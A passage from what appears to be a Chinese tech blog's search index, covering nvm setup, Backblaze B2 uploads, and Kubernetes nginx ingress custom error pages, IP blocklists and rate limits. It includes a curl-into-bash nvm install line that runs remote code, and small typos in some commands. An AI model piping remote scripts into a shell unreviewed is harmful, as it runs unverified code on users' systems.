href=\"https://hubot.github.com/docs/adapters/development/\"\u003ehttps://hubot.github.com/docs/adapters/development/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e里面都是 coffee 味的单箭头函数，导致不太熟悉的八戒以为在 wechatwork module导出的时候也应该用单箭头函数，结果就悲剧了。\u003c/p\u003e","title":"hubot集成企业微信+jenkins+ansible"},{"content":"最近在搞 JavaScripts，nodejs的版本满天飞，之前用的 nvm 管理的方法突然不能用了。\n这里记录一下，比较新的 nvm 的安装使用方法：\n下载安装：\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash 以上的脚本安装到底做了什么呢？\n一、它 clone 了 nvm 到 $HOME/.nvm目录\n二、它在 .bashrc 中添加了三行\n事实上它是根据当前的 bash 选择在 .bash_profile、.zshrc、.profile、.bashrc中的某一个进行添加\n然后我们退出终端，并重新进入，看看\nnvm list nvm ls-remote 然后选择最新的版本安装：\nnvm install v16.13.1 如果想使用不同版本\nnvm use 14.0.0 设置缺省版本或者取消\nnvm alias defaut \u0026lt;your_nodejs_default_version\u0026gt; nvm alias default 14.0.0 node -v # prints 14.0.0 参考地址：https://github.com/nvm-sh/nvm\n","permalink":"https://rendoumi.com/posts/20211217-nodejs_nvm/","summary":"\u003cp\u003e最近在搞 JavaScripts，nodejs的版本满天飞，之前用的 nvm 管理的方法突然不能用了。\u003c/p\u003e\n\u003cp\u003e这里记录一下，比较新的 nvm 的安装使用方法：\u003c/p\u003e\n\u003cp\u003e下载安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以上的脚本安装到底做了什么呢？\u003c/p\u003e\n\u003cp\u003e一、它 clone 了 nvm 到 $HOME/.nvm目录\u003c/p\u003e\n\u003cp\u003e二、它在 .bashrc 中添加了三行\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211217093956358\" loading=\"lazy\" src=\"/posts/20211217-nodejs_nvm/image-20211217093956358.png\"\u003e\u003c/p\u003e\n\u003cp\u003e事实上它是根据当前的 bash 选择在 .bash_profile、.zshrc、.profile、.bashrc中的某一个进行添加\u003c/p\u003e\n\u003cp\u003e然后我们退出终端，并重新进入，看看\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm ls-remote\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后选择最新的版本安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install v16.13.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果想使用不同版本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm use 14.0.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e设置缺省版本或者取消\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e defaut \u0026lt;your_nodejs_default_version\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e default 14.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v \u003cspan class=\"c1\"\u003e# prints 14.0.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e参考地址：https://github.com/nvm-sh/nvm\u003c/p\u003e","title":"nodejs多版本的安装与管理"},{"content":"S3 的桶存储可以用 minio 来模拟。\n网上有个 Backblaze 的网站，提供 10GB 的免费空间，且如果是公网访问，1GB流量是免费的，如果前面套了 Cloudflare 的CDN，那基本是全免了。\n说下使用方式：\n首先去 https://www.backblaze.com/ 注册个帐号：\n然后直接建个桶（Create a Bucket）\n桶文件类型选择 public，否则无法公网访问：\n然后 gen 出 master app key 来并记录好：\n随后最大的问题就来了，如果你用它页面自带的上传下载工具，彻底完蛋，拖进去的文件夹会变成扁平的，完全丧失目录结构。\n必须要找一个好用的上传工具了，推荐 b2 。\nb2 工具下载：\nhttps://github.com/Backblaze/B2_Command_Line_Tool\n下载后直接改名为 b2 ，然后放到 /usr/local/bin 中\nwget -O /usr/local/bin/b2 https://github.com/Backblaze/B2_Command_Line_Tool/releases/download/v3.1.0/b2-linux chmod 755 /usr/lcoal/b2 运行一下，有很多命令参数：\n详细的使用文档：\nhttps://b2-command-line-tool.readthedocs.io/en/master/\n先去配置帐号，输入applicationKeyId和applicationKey\nb2 authorize-account 然后就可以往桶里传东西了，把当前目录下的东西传到 rendoumi 这个桶里，并且不要传 .git 目录\nb2 sync --excludeDirRegex .git . b2://rendoumi/ 套 Cloudflare 就随意了。full ssl，建个 CNAME 且用 Page rule 做 url 转发就可以了。\n","permalink":"https://rendoumi.com/posts/20211208-backblaze_usage/","summary":"\u003cp\u003eS3 的桶存储可以用 minio 来模拟。\u003c/p\u003e\n\u003cp\u003e网上有个 Backblaze 的网站，提供 10GB 的免费空间，且如果是公网访问，1GB流量是免费的，如果前面套了 Cloudflare 的CDN，那基本是全免了。\u003c/p\u003e\n\u003cp\u003e说下使用方式：\u003c/p\u003e\n\u003cp\u003e首先去 \u003ca href=\"https://www.backblaze.com/\"\u003ehttps://www.backblaze.com/\u003c/a\u003e 注册个帐号：\u003c/p\u003e\n\u003cp\u003e然后直接建个桶（Create a Bucket）\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208141419298\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208141419298.png\"\u003e\u003c/p\u003e\n\u003cp\u003e桶文件类型选择 public，否则无法公网访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208141521449\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208141521449.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后 gen 出 master app key 来并记录好：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208142149530\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208142149530.png\"\u003e\u003c/p\u003e\n\u003cp\u003e随后最大的问题就来了，如果你用它页面自带的上传下载工具，彻底完蛋，拖进去的文件夹会变成扁平的，完全丧失目录结构。\u003c/p\u003e\n\u003cp\u003e必须要找一个好用的上传工具了，推荐 b2 。\u003c/p\u003e\n\u003cp\u003eb2 工具下载：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Backblaze/B2_Command_Line_Tool\"\u003ehttps://github.com/Backblaze/B2_Command_Line_Tool\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e下载后直接改名为 b2 ，然后放到 /usr/local/bin 中\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -O /usr/local/bin/b2 https://github.com/Backblaze/B2_Command_Line_Tool/releases/download/v3.1.0/b2-linux\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /usr/lcoal/b2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e运行一下，有很多命令参数：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208142026377\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208142026377.png\"\u003e\u003c/p\u003e\n\u003cp\u003e详细的使用文档：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://b2-command-line-tool.readthedocs.io/en/master/\"\u003ehttps://b2-command-line-tool.readthedocs.io/en/master/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e先去配置帐号，输入applicationKeyId和applicationKey\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eb2 authorize-account\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后就可以往桶里传东西了，把当前目录下的东西传到 rendoumi 这个桶里，并且不要传 .git 目录\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eb2 sync --excludeDirRegex .git . b2://rendoumi/ \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e套 Cloudflare 就随意了。full ssl，建个 CNAME 且用 Page rule 做 url 转发就可以了。\u003c/p\u003e","title":"Backblaze类S3免费免备案对象存储"},{"content":"kubernetes下定制 http 50x 以及 40x 服务器返回信息的话，如果用 Nginx 做 ingress，大家会很自然想到直接用 nginx 来定制：\nerror_page 500 502 503 504 /50x.html; location = /50x.html { root /export/html; } 这样做是不行的，因为 Nginx 作为 ingress 来使用，就不能落地，只能做转发；如果你落地了，访问了本地文件，就违背了初衷。而且在 ingress 的 pod 上放页面，会导致 ingress 的配置错乱。\n那么正确 50x 重定位的方法如下：首先建立一个 deploy 和对应的 svc，就是建立一个 web 服务器，能提供服务返回 50x 和 40x 的定制页面；然后在 ingress\n内指定 custom-http-errors 和 default-backend 指向它就可以了。\n一、建立miniserve的deploy和svc 我们选用 rust 的 miniserve 作为 web 服务器，准备好定制好的 index.html，写个 Dockerfile\n网址：https://github.com/svenstaro/miniserve\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY . /data/ RUN rm -rf /data/Dockerfile WORKDIR /data EXPOSE 8080 CMD [\u0026#34;/data/miniserve\u0026#34;,\u0026#34;--index\u0026#34;,\u0026#34;index.html\u0026#34;] #CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; 作出镜像后推送到阿里镜像：registry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest\n然后准备好 deploy和 svc，部署到 kubernetes 里\n--- apiVersion: apps/v1 kind: Deployment metadata: name: miniserve-deploy labels: app: miniserve spec: replicas: 1 selector: matchLabels: app: miniserve template: metadata: labels: app: miniserve spec: containers: - name: miniserve image: registry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest imagePullPolicy: Always ports: - containerPort: 8080 --- apiVersion: v1 kind: Service metadata: name: miniserve-svc labels: app: miniserve spec: ports: - name: http protocol: TCP port: 80 targetPort: 8080 selector: app: miniserve type: ClusterIP 二、修改ingress 修改的地方就是 annotations 的最后两行：\napiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: kala-com-ingress annotations: kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; nginx.ingress.kubernetes.io/limit-connections: \u0026#34;2\u0026#34; nginx.ingress.kubernetes.io/limit-rpm: \u0026#34;2\u0026#34; nginx.ingress.kubernetes.io/limit-rps: \u0026#34;1\u0026#34; nginx.ingress.kubernetes.io/app-root: \u0026#34;/webui/\u0026#34; nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: kala-auth nginx.ingress.kubernetes.io/auth-realm: \u0026#39;Authentication Required - Kala\u0026#39; nginx.ingress.kubernetes.io/default-backend: \u0026#34;miniserve-svc\u0026#34; nginx.ingress.kubernetes.io/custom-http-errors: \u0026#34;403,404,500,502,503,504\u0026#34; spec: rules: - host: kala.rendoumi.com http: paths: - path: / backend: serviceName: kala-svc servicePort: 80 测试的话用 wrk 压住，然后curl再测就503转到miniserve-svc\nwrk -c 3 -t 3 -d 10 http://kala.rendoumi.com/webui/ --latency curl -v -H \u0026#34;Host: kala.rendoumi.com\u0026#34; http://kala.rendoumi.com/webui/ ","permalink":"https://rendoumi.com/posts/20211129-kubernetes_custom_503/","summary":"\u003cp\u003ekubernetes下定制 http 50x 以及 40x 服务器返回信息的话，如果用 Nginx 做 ingress，大家会很自然想到直接用 nginx 来定制：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eerror_page   500 502 503 504  /50x.html;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003elocation\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e/50x.html {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e            root   /export/html;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样做是不行的，因为 Nginx 作为 ingress 来使用，就不能落地，只能做转发；如果你落地了，访问了本地文件，就违背了初衷。而且在 ingress 的 pod 上放页面，会导致 ingress 的配置错乱。\u003c/p\u003e\n\u003cp\u003e那么正确 50x 重定位的方法如下：首先建立一个 deploy 和对应的 svc，就是建立一个 web 服务器，能提供服务返回 50x 和 40x 的定制页面；然后在 ingress\u003c/p\u003e\n\u003cp\u003e内指定 custom-http-errors 和 default-backend 指向它就可以了。\u003c/p\u003e\n\u003ch2 id=\"一建立miniserve的deploy和svc\"\u003e一、建立miniserve的deploy和svc\u003c/h2\u003e\n\u003cp\u003e我们选用 rust 的 miniserve 作为 web 服务器，准备好定制好的 index.html，写个 Dockerfile\u003c/p\u003e\n\u003cp\u003e网址：https://github.com/svenstaro/miniserve\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY . /data/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN    rm -rf /data/Dockerfile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [\u0026#34;/data/miniserve\u0026#34;,\u0026#34;--index\u0026#34;,\u0026#34;index.html\u0026#34;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e作出镜像后推送到阿里镜像：\u003ccode\u003eregistry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest\u003c/code\u003e\u003c/p\u003e","title":"kubernetes下定制服务器503以及其他的403消息"},{"content":"在 kubernetes 中，ingress 负责转发、融断和限流。\n我们以 Nginx ingress 为例，讨论一下这方面的问题。\n一、Nginx ingress黑白名单 这个很简单了，丢进黑名单或者白名单，在入口前拦一刀。\n我们只要在 annotations 声明即可：\napiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: www-com-ingress annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/block-cidrs: a.b.c.d/32 #nginx.ingress.kubernetes.io/whitelist-source-range: a.b.c.d/32 spec: tls: - hosts: - www.huabbao.com secretName: www-huabbao-com-cert rules: - host: www.huabbao.com http: paths: - path: / backend: serviceName: nginx-svc 注意，多个ip的话，之间用逗号隔开（该值是逗号分隔的CIDR列表） ：\nnginx.ingress.kubernetes.io/whitelist-source-range: \u0026#39;58.246.36.130,180.167.74.98,114.85.176.38’ 二、Nginx ingress限速 限速这个问题比较复杂，首先我们需要考虑到用户体验，如果很鲁棒性的强制限制客户端流量是10KB，那么如果一开始的加载页面如果较大，客户直接就离场了。所以首先要考虑要有初始字节量，这个量需要能让客户顺畅的打开首页。然后我们再设定请求速率，再考虑单个IP地址的并发连接量（并发量×速率=客户端实际速率），第四个再考虑每分钟或每秒的最大请求数。\n以下注释定义按顺序排列，可以设置单个客户端IP地址打开的连接的限制，可用于缓解DDoS攻击。\n一、nginx.ingress.kubernetes.io/limit-rate-after：设置初始字节量，在此之后，进一步传输将受到limit-rate速率限制。 二、nginx.ingress.kubernetes.io/limit-rate：每秒接受的请求速率（每秒字节数）。 三、nginx.ingress.kubernetes.io/limit-connections：来自单个IP地址的并发连接数。（可以建立最大连接数） 四、nginx.ingress.kubernetes.io/limit-rps：每秒可从给定IP接受的连接数。（每个源 IP 每个源 IP 每秒最大请求次数） 五、nginx.ingress.kubernetes.io/limit-rpm：每分钟可从给定IP接受的连接数。（每个源 IP 每分钟最大请求次数） 可以指定 nginx.ingress.kubernetes.io/limit-whitelist 设置从速率限制中排除的客户端IP源范围，该值也是逗号分隔的CIDR列表。\n如果在单个Ingress规则中设置了多个注释 limit-rpm，则 limit-rps 优先。\napiVersion: extensions/v1beta1 kind: Ingress metadata: name: my-ingress annotations: nginx.ingress.kubernetes.io/limit-rate-after: 500k nginx.ingress.kubernetes.io/limit-rate: 50k nginx.ingress.kubernetes.io/limit-connections: \u0026#34;3\u0026#34; nginx.ingress.kubernetes.io/limit-rps: \u0026#34;1\u0026#34; nginx.ingress.kubernetes.io/limit-rpm: \u0026#34;3\u0026#34; nginx.ingress.kubernetes.io/limit-whitelist: \u0026#34;192.168.7.0/24\u0026#34; spec: rules: - host: my.test.com http: paths: - path: / backend: serviceName: nginx servicePort: 80 解释一下：\n首先设置了初始字节量是500k\n然后初始字节量用完之后，限制用户传输速率是50k/s\n随后并发连接设置为3，那么客户端如果同时打开3个连接，总速率是 50k×3=150k/s\n第四步进一步设置了每秒最大请求次数是1，下面又设置每分钟最大请求次数是3。\n第五步设置了 192.168.7.0/24 这段不受限速的影响\n设置好以后压测试一下：\n超限返回的代码是503\nwrk -c 3 -t 3 -d 10 http://m.test.com --latency curl -v -H \u0026#34;Host: m.test.com\u0026#34; http://m.test.com \u0026lt; HTTP/1.1 503 Service Temporarily Unavailable \u0026lt; Date: Wed, 28 Jul 2021 04:32:03 GMT \u0026lt; Content-Type: text/html \u0026lt; Content-Length: 190 \u0026lt; Connection: keep-alive HTTP/1.1 503 Service Temporarily Unavailable ","permalink":"https://rendoumi.com/posts/20211129-kubernetes_nginx_ingress_limit/","summary":"\u003cp\u003e在 kubernetes 中，ingress 负责转发、融断和限流。\u003c/p\u003e\n\u003cp\u003e我们以 Nginx ingress 为例，讨论一下这方面的问题。\u003c/p\u003e\n\u003ch2 id=\"一nginx-ingress黑白名单\"\u003e一、Nginx ingress黑白名单\u003c/h2\u003e\n\u003cp\u003e这个很简单了，丢进黑名单或者白名单，在入口前拦一刀。\u003c/p\u003e\n\u003cp\u003e我们只要在 annotations 声明即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211129102114725\" loading=\"lazy\" src=\"/posts/20211129-kubernetes_nginx_ingress_limit/image-20211129102114725.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enetworking.k8s.io/v1beta1 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eIngress \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ewww-com-ingress \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eannotations\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003ekubernetes.io/ingress.class\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enginx \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003enginx.ingress.kubernetes.io/ssl-redirect\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003enginx.ingress.kubernetes.io/block-cidrs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ea.b.c.d/32 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#nginx.ingress.kubernetes.io/whitelist-source-range: a.b.c.d/32 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003etls\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e- \u003cspan class=\"nt\"\u003ehosts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e- \u003cspan class=\"l\"\u003ewww.huabbao.com \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003esecretName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ewww-huabbao-com-cert \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003erules\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e- \u003cspan class=\"nt\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ewww.huabbao.com \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"nt\"\u003epaths\u003c/span\u003e\u003cspan 